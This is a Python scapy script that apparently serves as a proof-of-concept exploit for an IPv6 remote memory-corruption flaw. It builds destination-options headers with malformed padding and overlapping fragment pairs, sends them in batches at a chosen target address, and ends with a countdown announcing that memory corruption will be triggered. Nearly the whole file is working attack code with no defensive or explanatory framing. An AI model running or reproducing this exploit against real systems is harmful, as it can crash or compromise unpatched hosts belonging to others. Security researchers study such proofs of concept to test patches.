from scapy.all import *

# Define global variables
iface = ''  # Specify the network interface to use
ip_addr = ''  # Target IP address
mac_addr = ''  # Target MAC address (optional)
num_tries = 20  # Number of packet sets to generate per batch
num_batches = 20  # Number of batches to send

# Function to generate packets with MAC address
def get_packets_with_mac(i):
    frag_id = 0xdebac1e + i  # Calculate a unique fragment ID based on the loop index
    # Create the first packet with a destination options header and padding
    first = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ip_addr) / \
            IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='a'*3)])
    # Create the second packet with a fragmented payload
    second = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ip_addr) / \
             IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / 'aaaaaaaa'
    # Create the third packet to complete the fragment
    third = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ip_addr) / \
            IPv6ExtHdrFragment(id=frag_id, m=0, offset=1)
    return [first, second, third]  # Return the list of packets

# Function to generate packets without MAC address (IPv6 only)
def get_packets(i):
    if mac_addr != '':  # Check if a MAC address is provided
        return get_packets_with_mac(i)
    frag_id = 0xdebac1e + i  # Calculate a unique fragment ID based on the loop index
    # Create the first packet with a destination options header and padding
    first = IPv6(fl=1, hlim=64+i, dst=ip_addr) / \
            IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='a'*3)])
    # Create the second packet with a fragmented payload
    second = IPv6(fl=1, hlim=64+i, dst=ip_addr) / \
             IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / 'aaaaaaaa'
    # Create the third packet to complete the fragment
    third = IPv6(fl=1, hlim=64+i, dst=ip_addr) / \
            IPv6ExtHdrFragment(id=frag_id, m=0, offset=1)
    return [first, second, third]  # Return the list of packets

# Main execution loop
final_ps = []  # Initialize an empty list to store packets
for _ in range(num_batches):  # Loop through the number of batches
    for i in range(num_tries):  # Loop through the number of tries per batch
        final_ps += get_packets(i) + get_packets(i)  # Generate and add packets to the list

# Sending the packets
print("Sending packets")
if mac_addr != '':  # Check if a MAC address is provided
    sendp(final_ps, iface=iface)  # Send packets at layer 2 (Ethernet)
else:
    send(final_ps, iface=iface)  # Send packets at layer 3 (IPv6)

# Countdown for memory corruption (if applicable)
for i in range(60):  # Loop through 60 seconds countdown
    print(f"Memory corruption will be triggered in {60-i} seconds", end='\r')
    time.sleep(1)  # Wait for 1 second between iterations
print("")  # Print a newline after countdown
